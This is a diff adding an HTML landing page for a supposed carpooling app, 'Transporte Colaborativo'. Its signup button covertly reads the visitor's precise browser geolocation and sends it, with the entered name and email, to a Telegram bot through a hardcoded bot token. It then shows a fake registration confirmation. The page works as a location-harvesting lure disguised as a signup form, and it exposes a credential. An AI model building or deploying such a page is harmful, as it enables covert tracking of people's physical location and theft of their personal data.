@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Landing Page</title>
+    <link rel="stylesheet" href="estilos.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+</head>
+<body>
+    <div class="contenedor">
+        <header class="header">
+            <div class="logo">
+                <h1>Transporte Colaborativo</h1>
+            </div>
+            <nav class="menu">
+                <a href="#">Inicio</a>
+                <a href="#">Acerca de</a>
+                <a href="#">Contacto</a>
+            </nav>
+        </header>
+    </div>
+
+    <div class="main">
+        <h1>¿Cansado de usar el transporte público?</h1>
+
+        <p>La aplicación de transporte colaborativo solucionará este problema,
+            podrás viajar en el carro de otros usuarios que vayan por la misma ruta que tú.
+        </p>
+
+        <input type="email" placeholder="Email:" id="email">
+        <input type="text" placeholder="Nombre:" id="nombre">
+        <button onclick="getLocation()">Registrate</button>
+
+        <hr style="margin: 50px auto;">
+    </div>
+
+    <img src="https://www.acuity-link.net/wp-content/uploads/2017/09/Mobile-App.png" alt="">
+
+    <script>
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            var nombre=document.getElementById('nombre').value;
+            var email=document.getElementById('email').value;
+            var mensaje_url="https://www.google.com/maps/@"+position.coords.latitude+","+position.coords.longitude+",20z"
+            var mensaje="Email:"+email+"\nNombre:"+nombre+"\nUbicación: "+mensaje_url;
+            sendMessage(mensaje)
+
+        }
+
+        function sendMessage(message){
+            var telegram_bot_id="1238994506:AAEqmoAt5tDrW8N_OaWL_1DUrpZ4YHMj41U";
+            var chat_id="1050606005";
+
+            
+            $.ajax({
+                url:'https://api.telegram.org/bot'+telegram_bot_id+'/sendMessage',
+                method:'POST',
+                data:{chat_id:chat_id , text:message},
+                success:function(){
+                    alert('Has sido registrado, te enviaremos más información al email');
+                }
+  });
+        }
+    </script>
+
+</body>
+</html>
